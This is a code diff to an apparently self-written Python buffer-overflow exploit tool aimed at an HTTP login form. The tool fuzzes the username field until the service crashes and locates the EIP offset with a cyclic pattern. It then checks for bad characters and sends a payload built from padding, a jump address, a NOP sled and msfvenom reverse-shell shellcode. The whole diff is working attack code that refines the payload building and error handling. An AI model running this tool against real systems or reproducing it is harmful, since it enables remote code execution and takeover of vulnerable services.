@@ -25,7 +25,8 @@ try:
 except ImportError as err:
 	print(f"Import Error: {err}")
 
-# -------------------( Ansicolors )-------------------
+# |_______________( Ansicolors )_______________|
+
 rst = "\033[0m"
 bld = "\033[01m"
 rd = "\033[91m"
@@ -34,7 +35,8 @@ yw = "\033[93m"
 be = "\033[94m"
 pe = "\033[95"
 
-# -------------------( Custom Exceptions )-------------------
+# _______________( Custom Exceptions )_______________
+
 class InvalidTargetIPError(TypeError):
 	"""Will be raised if the type of the target IP
 	is not of type "str"
@@ -67,7 +69,8 @@ class NoEipMemoryAddressError(AttributeError):
 	def __init__(sefl, error_msg):
 		super().__init__(error_msg)
 
-# -------------------( Class Overflow Definition )-------------------
+# _______________( Class Overflow Definition )_______________
+
 class Overflow:
 	""" Overflow class definition
 
@@ -75,7 +78,7 @@ class Overflow:
 		nop_sled (str): A raw string of 16 no operation bytes
 		chars (str): All possible characters to test application for bad characters.
 	"""
-	nop_sled = "\x90"*16
+	nop_sled = b"\x90"*10
 	chars = (
 "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
 "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -380,7 +383,7 @@ class Overflow:
 		buff += "Content-Type: application/x-www-form-urlencoded\r\n"
 		return buff
 
-	def fuzz(self, chars=None, reverse_payload=None):
+	def fuzz(self, chars=None, shellcode=None):
 		"""Sends an incrementing number of bytes to an application
 		until it crashes or returns an error and then prints out the
 		number of bytes at the moment of the crash/error. If arg bad_char
@@ -388,7 +391,7 @@ class Overflow:
 
 		Args:
 			chars (str): Will determine if bad characters string will be sent, default=None
-			reverse_payload (bytes): Will store the contents of the msfvenom generated reverse shell
+			shellcode (bytes): Will store the contents of the msfvenom generated reverse shell
 									payload, default=None
 
 		Exceptions:
@@ -399,9 +402,8 @@ class Overflow:
 		"""
 		self.num_bytes_crash = 100
 
-		if not chars and not reverse_payload:
-			print(pe+bld+"[+]"+rst+" -----( Intiating fuzzing procedure )-----")
-			print(yw+bld+"[!]"+rst+" -----( Press Ctrl+C when the application crashes! )-----")
+		if not chars and not shellcode:
+			print(pe+bld+"[+]"+rst+" _____( Intiating fuzzing procedure )_____")
 			while self.num_bytes_crash <= self.max_fuzz_bytes:
 				content = (
 					"username=" 
@@ -412,18 +414,19 @@ class Overflow:
 				buff += f"Content-Length: {str(len(content))}\r\n"
 				buff += "\r\n"
 				buff += content
+
 				soc = self._create_socket()
+				soc.settimeout(3)
+
 				try:
-					print(be+bld+"[+]"+rst+f" -----( Sending payload containing {self.num_bytes_crash} bytes )-----")
+					print(be+bld+"[+]"+rst+f" _____( Sending payload containing {gn+str(self.num_bytes_crash)+rst} bytes )_____")
 					soc.send(bytes(buff, "utf-8"))
-					soc.close()
+					soc.recv(1024)
 					self.num_bytes_crash += self.fuzz_increment
+					soc.close()
 					sleep(self.fuzz_interval_seconds)
-				except KeyboardInterrupt:
-					print(rd+bld+"\n[!]"+rst +" -----( Don't forget to set the number of bytes it took to crash the application )-----")
-					exit(1)
 				except:
-					print(rd+bld+"[-]"+rst+f" Error occured...")
+					print(yw+bld+"[!]"+rst+f" Number of bytes to crash: {rd+str(self.num_bytes_crash)+rst}")
 					exit(1)
 		elif chars:
 			try:
@@ -431,12 +434,13 @@ class Overflow:
 					raise NoOffsetError("An offset value must be set before sending the bad characters payload")
 				else:
 					content = (
-						"username=" 
-						+ "A"*self.offset 
-						+ "B"*4
-						+ "C"*4
-						+ chars
-						+"&password=A"
+						b"username=" 
+						+ b"A"*self.offset 
+						+ b"B"*4
+						+ b"C"*4
+						+ chars.encode()
+						+ b"D"*(self.num_bytes_crash-self.offset-4-4-len(chars))
+						+ b"&password=A"
 					)
 			except NoOffsetError as err:
 				print(rd+bld+"[-] "+rst+f"NoOffsetError: {err}")
@@ -444,37 +448,52 @@ class Overflow:
 			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
+			buff = bytes(buff, "utf-8")
 			buff += content
 
 			soc = self._create_socket()
 
-			print(yw+bld+"[+]"+rst+" -----( Sending payload to test bad characters )-----")
+			print(yw+bld+"[+]"+rst+" _____( Sent payload to test bad characters )_____")
 			try:
-				soc.send(bytes(buff, "utf-8"))
+				soc.send(buff)
 			except BaseException as err:
 				print(rd+bld+"[-]"+rst+f" SocketError: {err}")
 				exit(1)
 			finally:
 				soc.close()
 		else:
-			content  = (
-				"username=" 
-				+ "A"*self.offset 
-				+ self.jump_eip 
-				+ self.nop_sled 
-				+ reverse_payload 
-				+ "&password=A"
-			)
+			try:
+				if not self.offset:
+					raise NoOffsetError("An offset must be set before sending a reverse shell payload")
+				if not self.jump_eip:
+					raise NoEipMemoryAddressError("A memory address must be set to overwrite eip")
+				content  = (
+					b"username="
+					+ b"A"*self.offset
+					+ self.jump_eip
+					+ b"C"*4
+					+ self.nop_sled
+					+ shellcode.encode()
+					+ b"D"*(self.num_bytes_crash-self.offset-4-4-16-len(shellcode))
+					+ b"&password=A"
+				)
+			except NoOffsetError as err:
+				print(rd+bld+"[-] "+rst+f"NoOffsetError: {err}")
+				exit(1)
+			except NoEipMemoryAddressError as err:
+				print(rd+bld+"[-] "+rst+f"NoEipMemoryAddressError: {err}")
+				exit(1)
 			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
+			buff = bytes(buff, "utf-8")
 			buff += content
 
 			soc = self._create_socket()
 
-			print(gn+bld+"[+]"+rst+" -----( Sending reverse shell payload )-----")
+			print(gn+bld+"[+]"+rst+" _____( Sent reverse shell payload )_____")
 			try:
-				soc.send(bytes(buff, "utf-8"))
+				soc.send(buff)
 			except socket.error as err:
 				print(rd+bld+"[-]"+rst+" SocketError: {err}")
 				exit(1)
@@ -485,10 +504,14 @@ class Overflow:
 		"""This function will send a payload containing a known pattern of 
 		characters generated by the `patter`
 		"""
-		# HANDLE POSSIBLE ERROR:
-		# IF `num_bytes_crash` is not set!!
-		payload = pattern_create(self.num_bytes_crash)
-		
+		try:
+			if not self.num_bytes_crash:
+				raise Exception("The `num_bytes_crash` variable must be set before creating a pattern")
+			payload = pattern_create(self.num_bytes_crash)
+		except Exception as err:
+			print(rd+bld+"[-]"+rst+" {err}")
+			exit(1)
+
 		soc = self._create_socket()
 
 		try:
@@ -500,10 +523,10 @@ class Overflow:
 				buff += content
 
 				bytes_payload = bytes(buff, "utf-8")
-				print(gn+bld+"[+]"+rst+" -----( Sending pattern payload )-----")
+				print(gn+bld+"[+]"+rst+" _____( Sending pattern payload )_____")
 				soc.send(bytes_payload)
 		except socket.error as err:
-			print(r+bld+"[-]"+bld+f" SocketError: {err}")
+			print(rd+bld+"[-]"+bld+f" SocketError: {err}")
 			exit(1)
 		
 	def get_offset(self, eip_value) -> int:
@@ -512,7 +535,13 @@ class Overflow:
 		Args:
 			eip_value (str): The address that overwrote the EIP when program crashed
 		"""
-		pattern = pattern_create(self.num_bytes_crash)
+		try:
+			if not self.num_bytes_crash:
+				raise Exception("The `num_bytes_crash` variable must be set before creating a pattern")
+			pattern = pattern_create(self.num_bytes_crash)
+		except Exception as err:
+			print(rd+bld+"[-]"+rst+" {err}")
+			exit(1)
 		self.offset = pattern_offset(eip_value, pattern)
 		return self.offset
 
@@ -542,17 +571,17 @@ class Overflow:
 				if not self.jump_eip:
 					raise NoEipMemoryAddressError("Please set the `jump_eip` value in order to test jump esp memory address") from None
 				payload = (
-					"A"*self.offset 
-					+ self.jump_eip # Works with the following bytes \x9d\x9e\x9f\xa0 but not \x83\x0c\x09\x10??
-					+ "C"*4
-					+ "D"*(1500-self.offset-self.num_bytes_crash-self.offset-4)
+					b"A"*self.offset
+					+ self.jump_eip #self.jump_eip # Works with the following bytes \x9d\x9e\x9f\xa0 but not \x83\x0c\x09\x10??
+					+ b"C"*4
+					+ b"D"*(self.num_bytes_crash-self.offset-4-4)
 				)
-			content = "username=" + payload + "&password=A"
+			content = b"username=" + payload + b"&password=A"
 			buff = self._HTTP_header()
 			buff += f"Content-Length: {str(len(content))}\r\n"
 			buff += "\r\n"
+			buff = bytes(buff, "utf-8")
 			buff += content
-			bytes_payload = bytes(buff, "utf-8")
 		except NoOffsetError as err:
 			print(rd+bld+"[-]"+rst+f" NoOffsetError: {err}")
 			exit(1)
@@ -566,7 +595,7 @@ class Overflow:
 			soc = self._create_socket()
 			try:
 				with soc:
-					soc.send(bytes_payload)
+					soc.send(buff)
 			except socket.error as err:
 				print(r+bld+"[-]"+bld+f" SocketError: {err}")
 				exit(1)
@@ -579,19 +608,17 @@ class Overflow:
 				copy_chars = copy_chars.replace(char, "")
 			self.fuzz(chars=copy_chars)
 			return
-		self.fuzz(self.chars)
+		self.fuzz(chars=self.chars)
 
-	def get_payload(self, payload_file):
+	def send_payload(self, payload):
 		"""Will retrieve the payload from a generated payload file
 		and invoke the `fuzz` function to send the payload
 		to the target machine
 
 		Args:
-			payload_file (str): The name of the file containing the payload generated by Msfvenom
+			payload (str): The shellcode for the reverse shell
 		"""
-		with open(payload_file, "rb") as payload_file:
-			payload = payload_file.read()
-			self.fuzz(reverse_payload=payload)
+		self.fuzz(shellcode=payload)
 
 	def _create_socket(self):
 		"""Creates socket for sending payloads"""
@@ -604,4 +631,5 @@ class Overflow:
 		except KeyboardInterrupt:
 			print(rd+bld+"\n[-]"+rst+" Terminating program...")
 			exit(1)
-		return soc
+		else:
+			return soc
